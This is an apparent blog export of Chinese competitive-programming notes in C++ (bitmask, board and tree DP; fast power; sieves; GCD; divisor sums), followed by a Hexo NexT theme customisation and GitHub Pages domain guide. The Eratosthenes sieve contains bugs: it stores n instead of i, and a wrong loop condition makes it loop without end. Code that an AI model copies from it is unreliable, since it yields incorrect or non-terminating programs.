<h3 id="hamilton最短"><a href="#hamilton最短" class="headerlink" title="hamilton最短"></a>hamilton最短</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">20</span>,M=<span class="number">1</span>&lt;&lt;<span class="number">13</span>;</span><br><span class="line"><span class="type">int</span> w[N][N];</span><br><span class="line"><span class="type">int</span> dp[M][M];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; n ;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n;j++)</span><br><span class="line">            cin &gt;&gt; w[i][j];</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dp);</span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;<span class="comment">//走过了0这个点,从0到0这个点的方案</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span> &lt;&lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;&gt;j &amp;<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i-(<span class="number">1</span>&lt;&lt;j)&gt;&gt;k &amp;<span class="number">1</span>)</span><br><span class="line">                        dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i - (<span class="number">1</span> &lt;&lt; j)][k] + w[k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; dp[(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>][n<span class="number">-1</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="棋盘式DP"><a href="#棋盘式DP" class="headerlink" title="棋盘式DP"></a>棋盘式DP</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">12</span>, M=<span class="number">1</span> &lt;&lt; <span class="number">11</span> , k = <span class="number">110</span>;</span><br><span class="line">vector&lt;ll&gt; state;</span><br><span class="line">ll cnt[M];</span><br><span class="line">vector&lt;ll&gt; head[M];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line">ll f[N][k][M];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(ll x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((x&gt;&gt;i&amp;<span class="number">1</span>)&amp;&amp;(x&gt;&gt;i+<span class="number">1</span>&amp;<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">count</span><span class="params">(ll x)</span></span>&#123;</span><br><span class="line">    ll cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">        cnt += x &gt;&gt; i &amp; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span> &lt;&lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(i))&#123;</span><br><span class="line">            state.<span class="built_in">push_back</span>(i);</span><br><span class="line">            cnt[i] = <span class="built_in">count</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; state.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; state.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>((state[i]&amp;state[j])==<span class="number">0</span>&amp;&amp;<span class="built_in">check</span>(state[i]|state[j]))&#123;</span><br><span class="line">                head[i].<span class="built_in">push_back</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> z = <span class="number">0</span>; z &lt; state.<span class="built_in">size</span>();z++)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; head[z].<span class="built_in">size</span>();h++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">int</span> c = cnt[state[z]];</span><br><span class="line">                    <span class="keyword">if</span>(j&gt;=c)</span><br><span class="line">                        f[i][j][z] += f[i - <span class="number">1</span>][j - c][head[z][h]];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; f[n+<span class="number">1</span>][m][<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="树形DP"><a href="#树形DP" class="headerlink" title="树形DP"></a>树形DP</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">6010</span>;</span><br><span class="line"><span class="type">int</span> happy[N];</span><br><span class="line"><span class="type">int</span> e[N], ne[N], h[N], idx;</span><br><span class="line"><span class="type">bool</span> has_father[N];</span><br><span class="line"><span class="type">int</span> dp[N][<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    e[idx] = b, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    dp[u][<span class="number">1</span>] = happy[u];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>;i=ne[i])&#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="built_in">dfs</span>(j);</span><br><span class="line">        dp[u][<span class="number">0</span>] += <span class="built_in">max</span>(dp[j][<span class="number">0</span>], dp[j][<span class="number">1</span>]);</span><br><span class="line">        dp[u][<span class="number">1</span>] += dp[j][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        cin &gt;&gt; happy[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> a, b;</span><br><span class="line">            cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">            has_father[a] = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">add</span>(b, a);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="type">int</span> root = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(has_father[root])</span><br><span class="line">        root++;</span><br><span class="line">    <span class="built_in">dfs</span>(root);</span><br><span class="line">    cout &lt;&lt; <span class="built_in">max</span>(dp[root][<span class="number">1</span>], dp[root][<span class="number">0</span>]) &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h1><h2 id="数学快速幂"><a href="#数学快速幂" class="headerlink" title="数学快速幂"></a>数学快速幂</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qpow</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (b) &#123;</span><br><span class="line">		<span class="keyword">if</span> (b &amp; <span class="number">1</span>) </span><br><span class="line">			ans = ans * a;</span><br><span class="line">	    a *= a;</span><br><span class="line">		b &gt;&gt;= <span class="number">1</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">qpow</span>(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="筛质数"><a href="#筛质数" class="headerlink" title="筛质数"></a>筛质数</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> p[N], cnt;</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;<span class="comment">//埃氏筛</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!st[i]) &#123;</span><br><span class="line">			p[cnt++] = n;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = i + i; i &lt;= n; j +=i)st[j] = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes1</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;<span class="comment">//线性筛</span></span><br><span class="line">	<span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!st[i])p[cnt++] = i;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; p[j] &lt;= n / i; j++) &#123;</span><br><span class="line">			st[p[j] * i] = <span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">if</span> (i % p[j] == <span class="number">0</span>)<span class="keyword">break</span>;<span class="comment">//p[j]一定是i的最小质因子</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最大公约数欧几里得GCD"><a href="#最大公约数欧几里得GCD" class="headerlink" title="最大公约数欧几里得GCD"></a>最大公约数欧几里得GCD</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;<span class="comment">//输入时,b&gt;a</span></span><br><span class="line">	<span class="keyword">return</span> b ? <span class="built_in">gcd</span>(b, a % b) : a;<span class="comment">//如果b不是0，返回(b, a % b)，如果b是0，返回a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="求约数个数，求约数之和"><a href="#求约数个数，求约数之和" class="headerlink" title="求约数个数，求约数之和"></a>求约数个数，求约数之和</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//给定n个正整数，输出这些数字乘积的约数个数，答案对1e9+7取模</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	unordered_map&lt;<span class="type">int</span>, <span class="type">int</span> &gt; primes;</span><br><span class="line">	<span class="keyword">while</span> (n--) &#123;</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		cin &gt;&gt; x;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x / i; i++) &#123;</span><br><span class="line">			<span class="keyword">while</span> (x % i == <span class="number">0</span>) &#123;</span><br><span class="line">				primes[i]++;</span><br><span class="line">				x /= i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x &gt; <span class="number">1</span>)primes[x]++;</span><br><span class="line">	&#125;</span><br><span class="line">	ll res = <span class="number">1</span>;</span><br><span class="line">	<span class="comment">//for (auto tt : primes)res = res * (tt.second + 1) % mod;//求约数的个数</span></span><br><span class="line">	<span class="comment">//求约数之和</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> tt : primes) &#123;</span><br><span class="line">		<span class="type">int</span> p = tt.first, a = tt.second;</span><br><span class="line">		ll t = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (a--)t = (t * p + <span class="number">1</span>) % mod;</span><br><span class="line">		res = res * t % mod;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>​     </p>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+next优化搜集整理</title>
    <url>/EATPOOP/theme_better/2023/12/22/</url>
    <content><![CDATA[<blockquote>
<p>以下是自己在研究NEXT主题的时候想要完善自己的主题搜寻的整理的方法</p>
</blockquote>
<h2 id="添加阅读时间字数提示"><a href="#添加阅读时间字数提示" class="headerlink" title="添加阅读时间字数提示"></a>添加阅读时间字数提示</h2><p>效果如图：</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318548.jpg" alt="blob">

<ol>
<li>git 黑窗口中输入以下命令：</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>在blog的根目录的 _config中 复制下面这段话到末尾</strong></li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time</span>:</span><br><span class="line">  <span class="attr">symbols</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">time</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_symbols</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_time</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude_codeblock</span>: <span class="literal">false</span></span><br><span class="line">  <span class="attr">awl</span>: <span class="number">2</span>    </span><br><span class="line">  <span class="attr">wpm</span>: <span class="number">275</span></span><br><span class="line">  <span class="attr">suffix</span>: <span class="string">&quot;mins.&quot;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>在 <strong>主题的 config文件中找到，并且 输入 true即可，效果可以自行查看。</strong></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318577.jpg" alt="blob"></p>
<h2 id="添加网站运行时间"><a href="#添加网站运行时间" class="headerlink" title="添加网站运行时间"></a>添加网站运行时间</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">F:\hexo\blog\themes\next\layout\_partials\footer.swig</span><br></pre></td></tr></table></figure>

<p>在<strong>文件的末尾</strong>复制粘贴以下内容：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 网站运行时间的设置 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;timeDate&quot;</span>&gt;</span>载入天数...<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;times&quot;</span>&gt;</span>载入时分秒...<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">createtime</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> grt= <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;03/01/2023 10:00:00&quot;</span>); <span class="comment">//此处修改你的建站时间或者网站上线时间</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        now.<span class="title function_">setTime</span>(now.<span class="title function_">getTime</span>()+<span class="number">250</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        days = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>; dnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(days);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        hours = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> - (<span class="number">24</span> * dnum); hnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(hours);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span>(<span class="title class_">String</span>(hnum).<span class="property">length</span> ==<span class="number">1</span> )&#123;hnum = <span class="string">&quot;0&quot;</span> + hnum;&#125; minutes = (now - grt ) / <span class="number">1000</span> /<span class="number">60</span> - (<span class="number">24</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * hnum);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        mnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(minutes); <span class="keyword">if</span>(<span class="title class_">String</span>(mnum).<span class="property">length</span> ==<span class="number">1</span> )&#123;mnum = <span class="string">&quot;0&quot;</span> + mnum;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        seconds = (now - grt ) / <span class="number">1000</span> - (<span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * <span class="number">60</span> * hnum) - (<span class="number">60</span> * mnum);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        snum = <span class="title class_">Math</span>.<span class="title function_">round</span>(seconds); <span class="keyword">if</span>(<span class="title class_">String</span>(snum).<span class="property">length</span> ==<span class="number">1</span> )&#123;snum = <span class="string">&quot;0&quot;</span> + snum;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;timeDate&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;本站已安全运行 &quot;</span>+dnum+<span class="string">&quot; 天 &quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;times&quot;</span>).<span class="property">innerHTML</span> = hnum + <span class="string">&quot; 小时 &quot;</span> + mnum + <span class="string">&quot; 分 &quot;</span> + snum + <span class="string">&quot; 秒.&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="built_in">setInterval</span>(<span class="string">&quot;createtime()&quot;</span>,<span class="number">250</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>即可在网页的页脚显示网站已经运行了多长时间</p>
<p>效果如图下所示</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318589.jpg">

<h2 id="右上角Github图标"><a href="#右上角Github图标" class="headerlink" title="右上角Github图标"></a>右上角Github图标</h2><p>直接在主题配置文件中搜索：<code>github_banner</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># <span class="string">`Follow me on GitHub`</span> banner <span class="keyword">in</span> the top-right corner.</span><br><span class="line"><span class="attr">github_banner</span>:</span><br><span class="line">  <span class="attr">enable</span>: <span class="literal">true</span></span><br><span class="line">  <span class="attr">permalink</span>: <span class="attr">https</span>:<span class="comment">//github.com/zhzvite</span></span><br><span class="line">  <span class="attr">title</span>: <span class="title class_">Follow</span> me on <span class="title class_">GitHub</span></span><br></pre></td></tr></table></figure>

<p>然后修改内容即可。</p>
<p>如下图所示：</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318597.jpg" alt="blob">

<h2 id="添加搜索功能"><a href="#添加搜索功能" class="headerlink" title="添加搜索功能"></a>添加搜索功能</h2><p>打开博客的<strong>搜索文章的 功能</strong></p>
<p>下载<strong>搜索插件</strong>：</p>
<p>git bash黑窗口中输入：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>

<ol>
<li>主题 的 _config 配置文件中找到 <strong>local_search</strong>，下面的 <strong>enable输入true即可。</strong></li>
</ol>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318610.jpg" alt="blob">

<ol start="2">
<li>在根目录的 _config.yml 文件中 的末尾添加下面的内容：（选项的内容可以适当修改）</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># hexo-generator-searchdb</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><pre><code>hexo cl &amp;&amp;hexo g &amp;&amp;hexo s
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">即可看见更新</span><br><span class="line"></span><br><span class="line">如以下界面</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318618.jpg&quot; alt=&quot;blob&quot;&gt;</span><br><span class="line"></span><br><span class="line">## Github域名挂载</span><br><span class="line"></span><br><span class="line">&gt; github pages域名挂载,以阿里云域名为例子,其他域名类似</span><br><span class="line"></span><br><span class="line">### 第零步</span><br><span class="line"></span><br><span class="line">去[阿里云域名网站](https://wanwang.aliyun.com/newdomain/1yuan?domainCartTradeParams=dr_27906258_000&amp;_v_=6ff4a055f2f22f9d118832696bb06df3&amp;keyword=)买一个自己中意的域名,新人能享受1元一年服务,快剁手吧!</span><br><span class="line"></span><br><span class="line">### 第一步</span><br><span class="line"></span><br><span class="line">首先是用`ping`命令找到存放你的github pages的主机的IP地址，在终端里面用命令`ping xxx.github.io`便可完成，下图中红框内的就是我们要找的IP地址：</span><br><span class="line"></span><br><span class="line">![image-20240211133616800](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411944.png)</span><br><span class="line"></span><br><span class="line">记住这个ip地址</span><br><span class="line"></span><br><span class="line">### 第二步</span><br><span class="line"></span><br><span class="line">在购买域名的提供商为域名添加解析。我是在阿里云买的域名，因此我以阿里云的为例。在域名控制台选择想要绑定的域名，并点击解析：</span><br><span class="line"></span><br><span class="line">![image-20240211133754793](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411957.png)</span><br><span class="line"></span><br><span class="line">域名控制台</span><br><span class="line"></span><br><span class="line">然后添加如下两条记录：</span><br><span class="line"></span><br><span class="line">![image-20240211133415699](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411972.png)</span><br><span class="line"></span><br><span class="line">添加记录</span><br><span class="line"></span><br><span class="line">### 第三步</span><br><span class="line"></span><br><span class="line">打开命令行/终端,切换到blog文件夹内的source目录</span><br><span class="line"></span><br><span class="line">输入以下命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
touch CNAME
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20240211193911379](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111941964.png)</span><br><span class="line"></span><br><span class="line">然后会生成一个叫做CNAME的文件,打开编辑,里面输入你买的域名,不用写`http`/`https`和`www`</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111941981.png&quot; alt=&quot;image-20240211193948472&quot; style=&quot;zoom:50%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">然后可以尝试`hexo g+hexo d`部署你的博客,然后等一下github更新就好了</span><br><span class="line"></span><br><span class="line">之后若是想检查域名是否挂载成功可以做如下操作:</span><br><span class="line"></span><br><span class="line">在Github中，找到托管博客的`xxx.github.io`项目：</span><br><span class="line"></span><br><span class="line">![image-20240211133953100](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411984.png)</span><br><span class="line"></span><br><span class="line">进入到设置页面，并滑动到下方，找到**Github Pages**这一栏，在**Custom Domain看域名**是否是自己填的那个：</span><br><span class="line"></span><br><span class="line">![image-20240211134156078](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411994.png)</span><br><span class="line"></span><br><span class="line">到这儿就已经完成了，等待10分钟(左右)就可以使用自定义的域名访问github pages所提供的页面了。</span><br><span class="line"></span><br><span class="line">## 博客背景图片美化</span><br><span class="line"></span><br><span class="line">### 添加背景图片</span><br><span class="line"></span><br><span class="line">在blog的根目录下的source文件夹下新建_data文件夹，并且新建style.styl文件</span><br><span class="line"></span><br><span class="line">路径如下所示：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
F:\hexo\blog\source\_data\styles.styl
